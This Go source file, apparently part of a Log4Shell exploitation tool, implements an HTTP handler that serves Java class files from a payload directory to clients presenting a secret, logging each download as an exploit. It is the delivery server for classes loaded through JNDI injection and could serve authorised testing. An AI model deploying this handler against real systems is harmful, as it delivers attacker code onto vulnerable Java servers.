package log4shell

import (
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

type httpHandler struct {
	logger *log.Logger

	payloadDir string
	secret     string
}

func (h *httpHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	h.logger.Printf("[info] http client %s request %s", r.RemoteAddr, r.RequestURI)

	var success bool
	defer func() {
		if !success {
			w.WriteHeader(http.StatusNotFound)
		}
	}()

	// check url structure
	sections := strings.SplitN(r.RequestURI, "/", 3)
	if len(sections) < 3 {
		h.logger.Println("[error]", "invalid request url structure:", r.RequestURI)
		return
	}

	// compare secret
	if sections[0] != "" || sections[1] != h.secret {
		h.logger.Println("[warning]", "invalid secret:", sections[1])
		return
	}

	// prevent arbitrary file read
	path := sections[2]
	if strings.Contains(path, "../") || strings.Contains(path, "/..") {
		h.logger.Println("[warning]", "found slash in url:", r.RequestURI)
		return
	}

	// convert "/secret/calc.class/Main.class" to "/secret/calc.class"
	//         "/secret/Main.class/other.class" to "/secret/other.class"
	// path = strings.Replace(path, "Main.class", "", 1)
	// fmt.Println("path:", path)
	// path = filepath.Join(h.payloadDir, path)

	idx := strings.LastIndex(path, "/")
	if idx == -1 {
		h.logger.Println("[error]", "invalid request url structure:", r.RequestURI)
		return
	}
	path = filepath.Join(h.payloadDir, path[:idx])

	// read file and send to client
	class, err := os.ReadFile(path)
	if err != nil {
		h.logger.Println("[error]", "failed to read file:", err)
		return
	}
	success = true
	w.WriteHeader(http.StatusOK)
	_, err = w.Write(class)
	if err != nil {
		h.logger.Println("[error]", "failed to write class file:", err)
		return
	}
	h.logger.Printf("[exploit] http client %s download %s", r.RemoteAddr, path)
}
